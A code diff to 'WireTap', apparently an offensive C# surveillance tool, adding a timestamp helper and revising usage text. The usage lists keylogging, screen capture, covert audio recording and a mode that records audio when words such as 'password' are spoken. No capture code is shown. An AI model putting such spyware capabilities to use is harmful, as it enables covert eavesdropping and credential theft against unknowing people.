@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Runtime;
 
 namespace WireTap
 {
@@ -9,6 +10,13 @@ namespace WireTap
         {
             string result = Path.GetTempPath() + Guid.NewGuid().ToString() + extension;
             return result;
+        }
+
+        public static string CurrentTime()
+        {
+            DateTime dt = DateTime.Now;
+            string fmt = "[{0}/{1}/{2}] {3}:{4}:{5}";
+            return String.Format(fmt, dt.Month, dt.Day, dt.Year, dt.Hour, dt.Minute, dt.Second);
         }
 
         public static int ParseTimerString(string str)
@@ -44,7 +52,7 @@ Arguments can be one (and only one) of the following:
     record_sys [10s]     - Record audio from the system speakers (line-out).
                            Time suffix can be s/m/h.
 
-    record_audio [10s]   - Record audio from both the microphone and the speakers and combine into one file.
+    record_audio [10s]   - Record audio from both the microphone and the speakers.
                            Time suffix can be s/m/h.
     
     capture_screen       - Screenshot the current user's screen.
@@ -53,8 +61,9 @@ Arguments can be one (and only one) of the following:
 
     keylogger            - Begin logging keystrokes to a file.
 
-    listen_for_passwords - Listens for words 'username', 'password', 'login' and 'credential', and when heard,
-                           starts an audio recording for two minutes.
+    listen_for_passwords [keyword1,keyword2,keyword3] - Listens for words 'username', 'password', 'login',
+                                                        'logon', and 'credential' by default and when
+                                                        heard, starts an audio recording for two minutes.
 
 Examples:
     Record all audio for 30 seconds:
@@ -62,6 +71,9 @@ Examples:
 
     Start the keylogger:
         WireTap.exe keylogger
+
+    Start keyword listener (for a custom-set of strings):
+        WireTap.exe listen_for_passwords oil,password,email
 ";
             Console.WriteLine(usageString);
         }
